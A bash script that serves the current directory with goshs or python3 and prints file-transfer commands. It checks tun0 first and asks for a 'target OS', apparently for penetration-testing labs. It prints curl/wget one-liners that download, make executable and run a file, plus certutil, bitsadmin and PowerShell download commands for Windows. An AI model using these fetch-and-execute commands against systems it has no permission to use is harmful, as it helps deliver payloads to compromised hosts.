#!/usr/bin/env bash
# serve_local.sh
# Serve current directory with goshs (foreground). Prints download commands for each real file.
set -euo pipefail

PORT=80
INTERFACE=""

# Parse arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    -i|--interface)
      INTERFACE="$2"
      shift 2
      ;;
    -p|--port)
      PORT="$2"
      shift 2
      ;;
    *)
      echo "Unknown argument: $1"
      exit 1
      ;;
  esac
done

# Check if port is privileged and if user is root
if [[ "$PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
  echo "WARNING: Port $PORT is privileged and you are not root."
  PORT=8000
  echo "Falling back to port $PORT."
fi

# Get IP address
get_ip() {
  local iface=$1
  ip -4 addr show "$iface" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1
}

if [[ -n "$INTERFACE" ]]; then
  LOCAL_IP="$(get_ip "$INTERFACE")"
  if [[ -z "$LOCAL_IP" ]]; then
    echo "ERROR: No IPv4 address found on interface '$INTERFACE'."
    exit 1
  fi
else
  # Try tun0 first
  LOCAL_IP="$(get_ip "tun0")"
  if [[ -z "$LOCAL_IP" ]]; then
    echo "tun0 not found. Please select an interface:"
    # List all interfaces with IPv4 addresses, excluding lo
    mapfile -t IFACES < <(ip -o -4 addr show | awk '{print $2}' | grep -v 'lo' | sort -u)
    
    if [[ ${#IFACES[@]} -eq 0 ]]; then
      echo "ERROR: No active network interfaces with IPv4 addresses found."
      exit 1
    fi

    for i in "${!IFACES[@]}"; do
      echo "  [$((i+1))] ${IFACES[$i]} ($(get_ip "${IFACES[$i]}"))"
    done

    while true; do
      read -p "Enter number to select interface: " iface_idx
      if [[ "$iface_idx" =~ ^[0-9]+$ ]] && (( iface_idx >= 1 && iface_idx <= ${#IFACES[@]} )); then
        INTERFACE="${IFACES[$((iface_idx-1))]}"
        LOCAL_IP="$(get_ip "$INTERFACE")"
        break
      fi
      echo "Invalid selection."
    done
  else
    INTERFACE="tun0"
  fi
fi

echo "Using interface $INTERFACE with IP: $LOCAL_IP"
echo

# Collect regular files (non-recursive) in current directory
# Handles filenames with spaces/newlines safely by using NUL separators
mapfile -t FILES < <(find . -maxdepth 1 -type f -print0 | xargs -0 -n1 -I{} basename "{}" 2>/dev/null || true)

if [[ ${#FILES[@]} -eq 0 ]]; then
  echo "No regular files found in $(pwd)."
  echo
else
  echo "Files in $(pwd):"
  i=1
  for f in "${FILES[@]}"; do
    echo "  [$i] $f"
    ((i++))
  done
  echo
fi

# Selection logic
SELECTED_FILES=()
if [[ ${#FILES[@]} -gt 0 ]]; then
  while true; do
    read -p "Enter number to select file: " selection
    if [[ "$selection" =~ ^[0-9]+$ ]] && (( selection >= 1 && selection <= ${#FILES[@]} )); then
      SELECTED_FILES=("${FILES[$((selection-1))]}")
      echo "Selected: ${SELECTED_FILES[0]}"
      break
    fi
    echo "Invalid selection. Please enter a number between 1 and ${#FILES[@]}."
  done
  echo
fi

# OS Selection logic
TARGET_OS=""
while true; do
  echo "Target OS:"
  echo "  [1] Linux"
  echo "  [2] Windows"
  read -p "Enter number to select OS: " os_selection
  case "$os_selection" in
    1)
      TARGET_OS="Linux"
      break
      ;;
    2)
      TARGET_OS="Windows"
      break
      ;;
    *)
      echo "Invalid selection. Please enter 1 or 2."
      ;;
  esac
done
echo "Selected OS: $TARGET_OS"
echo

# Print download commands per file
echo "========== Download commands (per file) =========="
if [[ ${#SELECTED_FILES[@]} -eq 0 ]]; then
  echo "No files to print commands for. You can still browse the directory index at http://$LOCAL_IP:$PORT/"
else
  for f in "${SELECTED_FILES[@]}"; do
    # URL-encode minimal characters for space -> %20 (safe enough for typical filenames)
    # A simple URL-escape for spaces and a few common chars:
    # IMPORTANT: Encode % first to avoid double-encoding!
    url_encoded="${f//%/%25}"
    url_encoded="${url_encoded//#/%23}"
    url_encoded="${url_encoded// /%20}"
    echo
    echo "File: $f"
    
    if [[ "$TARGET_OS" == "Linux" ]]; then
      echo "  Linux:"
      echo "    curl -fsSL \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
      echo "    wget -q --show-progress -O \"$f\" \"http://$LOCAL_IP:$PORT/$url_encoded\" && chmod +x \"$f\" && ./\"$f\""
    elif [[ "$TARGET_OS" == "Windows" ]]; then
      echo "  Windows (CMD):"
      echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\""
      echo "    curl \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\""
      echo "    bitsadmin /transfer dl \"http://$LOCAL_IP:$PORT/$url_encoded\" \"%CD%\\$f\""
      echo
      echo "  Windows (PowerShell):"
      echo "    PowerShell -Command \"Invoke-WebRequest -Uri 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
      echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://$LOCAL_IP:$PORT/$url_encoded',''$f'')\""
      echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
    fi
  done
fi

echo
echo "=============================================="
echo "Starting goshs server on port $PORT (foreground)"
echo "Serving directory: $(pwd)"
echo "URL: http://$LOCAL_IP:$PORT/"
echo "(Press Ctrl+C to stop)"
echo "=============================================="
echo

# Start server (prefer goshs, fallback to python3)
if command -v goshs >/dev/null 2>&1; then
  echo "Starting goshs server on port $PORT (foreground)"
  exec goshs -p "$PORT"
elif command -v python3 >/dev/null 2>&1; then
  echo "WARNING: 'goshs' not found. Falling back to 'python3 -m http.server'."
  echo "Starting python3 server on port $PORT (foreground)"
  exec python3 -m http.server "$PORT"
else
  echo "ERROR: Neither 'goshs' nor 'python3' was found in PATH."
  exit 1
fi
